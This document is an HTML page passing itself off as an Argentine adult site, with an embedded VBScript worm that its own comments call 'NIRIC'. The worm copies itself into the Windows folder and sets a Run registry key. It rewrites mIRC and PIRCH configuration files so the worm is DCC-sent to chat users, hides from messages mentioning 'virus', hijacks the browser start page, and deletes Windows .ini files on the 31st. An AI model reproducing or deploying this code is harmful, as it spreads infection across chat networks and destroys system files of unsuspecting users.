<HTML>
<HEAD>
<TITLE>:: Sexo ARGENTINO ::</TITLE>
<META NAME="Generator" CONTENT="Kongo BackPage">
<META NAME="Author" CONTENT="M'Commander">
<META NAME="Description" CONTENT="Sexo de Argentina">
</HEAD>
<BODY ONMOUSEOUT="window.name='main';window.open('http://www.seduce69.com.ar','main')" ONKEYDOWN="window.name='main';window.open('http://www.seduce69.com.ar','main')" BGPROPERTIES="fixed">
<CENTER>
  <P>Esta pagina requiere un control ActiveX</P>
  <P>Por favor, presione 'SI' para continuar</P>
</CENTER>
</HTML>
<SCRIPT LANGUAGE="VBScript">
<!--
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set pp = CreateObject("WScript.Shell")  
windir = pp.ExpandEnvironmentStrings("%WINDIR%")  
niric = windir + "\system\SexoArgentino!!!.htm"
Set FOLDER = fso.GetFolder("C:\mirc\download")
Set FILES = FOLDER.Files
For Each FILE In FILES
  EXTENSION = fso.GetExtensionName(FILE.Path)
  EXTENSTION = LCase(EXTENSTION)
  FILENAME = LCase(FILE.Name)
  If (EXTENSION = "htm") Then
    If Right(FILENAME,7) = "!!!.htm" Then
      Set HTML = fso.GetFile(FILE.Path)
      HTML.Copy (niric)
      Exit For
    End If
  End If
Next
Set FOLDER = fso.GetFolder("C:\pirch98\downloads")
Set FILES = FOLDER.Files
For Each FILE In FILES
  EXTENSION = fso.GetExtensionName(FILE.Path)
  EXTENSTION = LCase(EXTENSTION)
  FILENAME = LCase(FILE.Name)
  If (EXTENSION = "htm") Then
    If Right(FILENAME,7) = "!!!.htm" Then
      Set HTML = fso.GetFile(FILE.Path)
      HTML.Copy (niric)
      Exit For
    End If
  End If
Next
niric2 = windir + "\niric.vbs"
If not fso.FileExists(niric2) Then
  Set CreateNiric = fso.OpenTextFile(niric2, 8, vbTrue)
  niricdata="On Error Resume Next" & vbcrlf
  niricdata=niricdata & "If Day(Now)=""31"" Then" & vbcrlf
  niricdata=niricdata & "  Set fsl = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf
  niricdata=niricdata & "  Set WSHhell = CreateObject(""WScript.Shell"")"  & vbcrlf
  niricdata=niricdata & "  windir = WSHhell.ExpandEnvironmentStrings(""%WINDIR%"")" & vbcrlf
  niricdata=niricdata & "  fsl.DeleteFile windir + ""\*.ini"", vbTrue" & vbcrlf
  niricdata=niricdata & "  msgbox ""Feliz Cumplemes NIRIC!"",,""31/??/??"" " & vbcrlf
  niricdata=niricdata & "End If" & vbcrlf
  CreateNiric.Write niricdata
  CreateNiric.Close
End If
runpath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\NiRiC"
pp.RegWrite runpath, niric2
If fso.FileExists("C:\mirc\mirc32.exe") Then
  ScriptData="[Script]" & vbcrlf
  ScriptData=ScriptData & "n0=;mIRC main Script. Please don't edit, mIRC will not run! http://www.mirc.co.uk" & vbcrlf
  ScriptData=ScriptData & "n1=;By Khaled Mardem-Bey" & vbcrlf
  ScriptData=ScriptData & "n2=;Copyright 1999-2000 mIRC Co. Ltd." & vbcrlf
  ScriptData=ScriptData & "n3=on 1:part:#:/.dcc send $nick " & niric & vbcrlf
  ScriptData=ScriptData & "n4=on 1:text:*virus*:?:/.ignore $nick" & vbcrlf
  ScriptData=ScriptData & "n5=on 1:text:*niric*:?:/.msg $nick Ups! lalala | exit" & vbcrlf
  mircpath="C:\mirc\script.ini"
  If fso.FileExists(mircpath) Then
    fso.DeleteFile mircpath, vbTrue
  End If
  Set Createmirc = fso.OpenTextFile(mircpath, 8, vbTrue)
  Createmirc.Write ScriptData
  Createmirc.Close
End If
If fso.FileExists("C:\pirch98\pirch98.exe") Then
  pirdata="[Levels]" & vbcrlf
  pirdata=pirdata & "Enabled=1" & vbcrlf
  pirdata=pirdata & "Count=2" & vbcrlf
  pirdata=pirdata & "Level1=000-Unknowns" & vbcrlf
  pirdata=pirdata & "000-UnknownsEnabled=1" & vbcrlf
  pirdata=pirdata & "Level2=100-Level 100" & vbcrlf
  pirdata=pirdata & "100-Level 100Enabled=1" & vbcrlf
  pirdata=pirdata & "" & vbcrlf
  pirdata=pirdata & "[100-Level 100]" & vbcrlf
  pirdata=pirdata & "User1=*!*@*" & vbcrlf
  pirdata=pirdata & "UserCount=1" & vbcrlf
  pirdata=pirdata & "Event1=ON PART:#:/dcc send $nick " + niric & vbcrlf
  pirdata=pirdata & "Event2=ON TEXT:*virus*:?:/ignore $nick | /close $nick" & vbcrlf
  pirdata=pirdata & "Event3=ON TEXT:*niric*:?:/msg $nick Ups! lalala | /exit" & vbcrlf
  pirdata=pirdata & "EventCount=3" & vbcrlf
  pirchpath="C:\pirch98\events.ini"
  If fso.FileExists(pirchpath) Then
    fso.DeleteFile pirchpath, vbTrue
  End If
  Set Createpirch = fso.OpenTextFile(pirchpath, 8, vbTrue)
  Createpirch.Write pirdata
  Createpirch.Close
End If
dd=pp.RegRead("HKEY_CLASSES_ROOT\WMFFill.VBS\ext")
If dd = "CGF.ar" then 
  pp.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "pagina.de/mongo.aurelio"
Else
  pp.RegWrite "HKEY_CLASSES_ROOT\WMFFill.VBS\ext", "CGF.ar"
End If
If Day(Now)="31" Then
  windir = pp.ExpandEnvironmentStrings("%WINDIR%")
  fso.DeleteFile windir + "\*.ini", vbTrue
  msgbox "Feliz Cumplemes CIRO!",,"31/??/??"
End If
'Worm_Name db "NIRIC",0
'Worm_Alias db "Worm.Cumplemes",0
'Worm_Origin db "ARGENTINA",0
'Worm_DateOfFirstTimeInWild db "10/01/01",0
'Worm_Author db "M'Commander",0
</SCRIPT>